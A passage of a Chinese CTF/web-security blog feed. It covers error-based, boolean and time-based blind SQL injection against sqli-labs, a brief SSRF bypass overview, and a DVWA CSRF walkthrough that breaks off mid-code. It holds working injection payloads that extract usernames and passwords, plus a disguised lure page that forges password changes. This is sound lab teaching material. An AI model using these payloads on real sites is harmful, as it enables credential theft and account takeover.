start="2"><li>使用<code>limit</code>函数对依次对结果进行遍历输出</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select concat(0x23,table_name,0x23) from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1) -- +</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705222241780.png" alt="image-20200705222241780"></p><p>不管哪一种方法，都可以查到我们需要的表<code>users</code></p><h3 id="5-求字段名（列名）">5.求字段名（列名）</h3><p>与查表名相类似，注入语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select substr(group_concat(0x23,column_name,0x23),1,50) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; ),1) -- +</span><br></pre></td></tr></table></figure><p>查询结果</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705222538905.png" alt="image-20200705222538905"></p><h3 id="6-查数据">6.查数据</h3><p>注入语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select substr(group_concat(0x23,username,0x24,password,0x23),110,50) from security.users ),1) -- +</span><br></pre></td></tr></table></figure><p>查询结果：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705224505884.png" alt="image-20200705224505884"></p><p>同样也拿到了admin账户的密码</p><h2 id="布尔型盲注">布尔型盲注</h2><p>如果在我们注入的时候网页中对数据库的查询信息没有任何回显（包括报错信息），那么我们就不能使用上面介绍的两种注入方式，这时候就需要我们尝试进行盲注。当我们的数据库执行语句正确的时候页面会显示一些正常信息，当我们注入的语句使数据库报错的时候，页面则不会显示信息，或者只提示语法错误，通过这个特点，我们可以对我们需要的内容进行逐字符猜测验证，从而拿到我们想要的数据</p><blockquote><p>这里使用Less-8进行试验</p></blockquote><h3 id="1-测注入点和闭合字符">1.测注入点和闭合字符</h3><p>与联合注入的操作方式一样，只是通过判断页面是否输出来检验闭合字符的正确性</p><p>通过测试，判断出来这里的注入字符为<code>'</code></p><h3 id="2-求库名">2.求库名</h3><p>求数据库名还是使用database()数据库，先查一下数据库名的长度</p><p>可以使用二分法依次尝试数据库名的长度</p><p>先判断长度是否小于10，如果条件成立则页面会有输出</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;10 -- +</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706142550048.png" alt="image-20200706142550048"></p><p>如果不成立，比如我们测试长度小于5</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;5 -- +</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706144745477.png" alt="image-20200706144745477"></p><p>那么页面不会有任何输出，说明我们构造的长度小于5使得数据库产生了语法错误，所以长度小于5是不成立的</p><p>然后再尝试小于8，发现依然没有输出，那么证明它的长度是不大于8并且小于10的，再尝试长度小于9，页面产生了输出，那么就可以判断数据库名的长度为8</p><p>再输入等于8进行检验</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())=8 -- +</span><br></pre></td></tr></table></figure><p>可以看到页面有正常输出，那么就可以确定库名的长度为8了</p><p>知道长度之后就可以逐字符猜测数据库名称了</p><p>对于数据库名的猜测使用ascii()函数，这个函数会输出传入参数的第一个字符的ASCII码，然后使用substr()函数对查到的数据库名进行逐字符分割</p><p>然后使用二分法逐字符判断出具体的数据库名</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii(substr(database(),1,1))&lt;115 -- +        [False]</span><br><span class="line">id=1&#x27; and ascii(substr(database(),1,1))&lt;116 -- +        [True]</span><br></pre></td></tr></table></figure><p>由此可以判断出数据库名的第一个字符的ASCII码为115，即字符<code>s</code></p><p>以此类推，就可以判断出整个数据库名为<code>security</code></p><h3 id="3-求表名">3.求表名</h3><p>要求得表名就要先知道数据库中有多少个表，这里使用count()函数进行判断</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)=4 -- +</span><br></pre></td></tr></table></figure><p>通过猜测select count()查询出来的值来判断数据库中表的个数，可以看到有4个表</p><p>对于具体的表名，就需要使用上面求数据库名的方法逐字符进行爆破猜测</p><p>首先使用concat()函数和limit语句限制查询结果的输出个数，然后对输出的每个表名使用substr()函数进行逐字符的拆分爆破</p><p>下面展示一个查询正确的注入语句</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii((select substr(concat(table_name),1,1) from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1))=117 -- +</span><br></pre></td></tr></table></figure><p>可以判断第四个表的第一个字符为<code>u</code></p><p>经过漫长的猜测查询过程后，我们得到了四个表的表名：<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>，其中users即为我们想要注入拿到数据的表</p><h3 id="4-求列名">4.求列名</h3><p>与求表名的步骤基本相同，只是这里需要查询<code>information_schema.columns</code>表</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii((select substr(concat(column_name),1,1) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1))=112 -- +</span><br></pre></td></tr></table></figure><p>通过不断爆破注入可以拿到<code>users</code>表中存在的字段有：<code>id</code>、<code>username</code>、<code>password</code></p><h3 id="5-查数据">5.查数据</h3><p>我们可以挨个查询username和password的值</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii((select substr(concat(username),1,1) from security.users limit 7,1))=97 -- +</span><br><span class="line">id=1&#x27; and ascii((select substr(concat(password),1,1) from security.users limit 7,1))=97 -- +</span><br></pre></td></tr></table></figure><p>通过不断尝试可以拿到admin的用户名和密码：admin/admin</p><h2 id="时间型盲注">时间型盲注</h2><p>如果网页对于数据库的查询不会有任何的返回结果或者报错输出，就没法使用布尔型盲注。页面无法提供有用的回显信息，就无法进行判断注入的正确与否，对于这种情况，我们一般采用基于web应用响应时间上的差异来判断是否存在SQL注入，即基于时间的SQL盲注。</p><p>时间型盲注会用到两个新的函数：<code>if()</code>和<code>sleep()</code></p><p>对于<code>if()</code>函数，一般我们使用的语法为：<code>if(查询语句,1,sleep(5))</code>，即如果我们查询的结果为真，那么网页正常加载返回结果；如果我们查询的语句为假，那么网页会加载5s之后才返回显示页面内容。我们可以根据页面返回时间的长短来判断我们的查询语句判断是否正确。进行到这里，我们的判断方法与之前的布尔型盲注就相同了，也就是构造查询语句来判断结果是否为真。</p><p>这里拿爆破出数据库长度作为例子进行讲解</p><p>首先我们使用的注入语句为：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())&lt;10,1,sleep(5)) -- +</span><br></pre></td></tr></table></figure><p>这里是判断数据库名的长度是否小于10，如果成立的话，页面直接就会加载出来，如果不成立，需要等待5s的时间页面才会加载完毕</p><p>这里提交URL之后，页面会立即加载出来，然后我们再进行下一步猜测</p><p>根据二分法的原则，这次注入的语句判断长度是否小于5：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())&lt;5,1,sleep(5)) -- +</span><br></pre></td></tr></table></figure><p>这次提交URL之后明显能感觉到网页的加载时间变长了许多，浏览器标签页的加载图标会徘徊那么一段时间</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/loading.gif" alt="页面加载"></p><p>同样地，我们再将长度的猜测改为小于8，发现加载时间还是比较长，然后改为&lt;9，加载时间就比较快了，由此可以推断出当前网页使用的数据库名的长度为8</p><p>对于其他需要查询的信息，就基本与布尔型盲注的查询方式相同，只需要将判断信息的查询语句放在<code>if()</code>函数的第一个参数中，然后根据页面加载的时间进行判断即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞原理简介及绕过技巧</title>
      <link href="/posts/50cf5e7c.html"/>
      <url>/posts/50cf5e7c.html</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF简介">SSRF简介</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</p><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h2 id="SSRF常见危害">SSRF常见危害</h2><ol><li><p>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的Banner信息等</p></li><li><p>攻击运行在内网或本地的应用程序</p></li><li><p>对内网Web应用进行指纹识别，通过访问默认文件实现( 如Readme等文件)</p></li><li><p>攻击内外网的Web应用，主要是使用GET就可以实现的攻击(比如Struts2，SQLI等)</p></li><li><p>利用File协议读取本地文件等</p></li></ol><h2 id="SSRF常见应用场景">SSRF常见应用场景</h2><ul><li>在线翻译</li><li>图片加载与下载</li><li>图片、文章收藏功能</li><li>未公开的API实现以及其他调用URL的功能等</li></ul><h2 id="SSRF常见绕过技巧">SSRF常见绕过技巧</h2><ul><li>利用@符号</li><li>利用localhost</li><li>利用短地址</li><li>利用特殊域名</li><li>利用DNS解析</li><li>利用Enclosed Alphanumerics</li><li>利用进制转换</li><li>其他协议绕过</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA练习——CSRF漏洞原理</title>
      <link href="/posts/7761df94.html"/>
      <url>/posts/7761df94.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-简介">1.简介</h2><p>CSRF（Cross-site request forgery，跨站请求伪造）通常是黑客利用已经登录的用户，诱使其访问或者登录某个早已构造好的恶意链接或者页面，然后在用户毫不知情的情况下，以用户的名义完成了非用户本意的非法操作。</p><p>这种攻击我们也被称为“One Click Attack“或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用行为。与XSS攻击相比，CSRF攻击往往不大流行(因此对其进行防范的资源也相当稀少)和难以防范。</p><h2 id="2-同源策略">2.同源策略</h2><h3 id="什么是同源策略">什么是同源策略</h3><p>同源策略由Netscape公司于1995年引入浏览器。目前，所有的浏览器都实行这个策略。它的含义是指，A网页设置的cookie，B网页不能打开，除非这两个网页同源。所谓的同源指的是三个相同：</p><ol><li>协议相同</li><li>域名相同</li><li>端口相同</li></ol><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200704195602375.png" alt="image-20200704195602375"></p><h3 id="同源策略的目的">同源策略的目的</h3><p>为了保证用户信息的安全，防止恶意的网站窃取数据。</p><h2 id="3-DVWA——CSRF漏洞学习">3.DVWA——CSRF漏洞学习</h2><h3 id="Low">Low</h3><p>将安全等级调为Low，查看Low级别的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源代码可以看出只是对用户输入的两个密码进行判断，看是否相等，不相等就提示密码不匹配。若相等则将密码使用MD5加密传入数据库保存。</p><p>我们尝试修改一次密码先看看情况：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200704103428983.png" alt="image-20200704103428983"></p><p>密码修改完后页面会提示<code>Password Changed</code>，而且关注一下URL也会发现，我们修改密码的信息，在URL中也体现出来了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>所以我们要是直接修改URL中的密码字段，并把它发给”受害者“，当受害者点开这个链接就会被修改密码</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200704103808168.png" alt="image-20200704103808168"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234&amp;password_conf=1234&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>把这个链接发送给“受害者”，当他点开这个链接，自己的密码就会被修改成我们恶意设置的<code>1234</code></p><h3 id="Medium">Medium</h3><p>先看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Checks to see where the request came from</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源码中可以看出Medium级别的代码在Low级别上添加了对HTTP请求头中的<code>Referer</code>字段的验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Checks to see where the request came from</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></figure><p>服务器会验证请求的来源，即用户HTTP请求头中的<code>Referer</code>字段中必须包含服务器的名字</p><p>如果我们再使用Low级别的方法直接打开链接，页面会提示请求不正确</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200704105140700.png" alt="image-20200704105140700"></p><p>我们正常修改一次密码，并用BurpSuite抓包查看HTTP请求头</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200704105542184.png" alt="image-20200704105542184"></p><p>发现请求头中存在Referer字段，并且里面包含服务器名<code>127.0.0.1</code></p><p>然后我们再抓取直接访问恶意链接的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200704105907456.png" alt="image-20200704105907456"></p><p>在这个请求头中并没有Referer字段，所以不能通过服务器的验证</p><p>我们手动在BurpSuite中添加<code>Referer</code>字段，然后Forward就可以发现页面提示密码修改成功</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200704110758138.png" alt="image-20200704110758138"></p><p>然而我们并不能在“受害者”的电脑上抓包啊，我们需要“受害者”被诱导点击恶意链接，从而达到目的。</p><p>我们可以构造一个页面，页面文件命名为服务器的名称，如<code>127.0.0.1.php</code>，在页面中写入加载可以恶意修改密码的链接的代码，然后将页面放在我们另外一台服务器主机中，将恶意网页的链接地址发送给“受害者”，当受害者打开链接后，就会被修改密码</p><p>恶意网页中可以使用图片的加载来隐藏我们构造的恶意修改密码的链接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;性感荷官 在线发牌&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=http:<span class="comment">//127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>由于这个页面的文件名为<code>127.0.0.1.php</code>，所以我们请求图片src的时候，它的请求头会包含<code>127.0.0.1.php</code>，也就包含了我们所需要的服务器名，从而达到绕过Referer验证的目的。</p><h3 id="High">High</h3><p>先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span 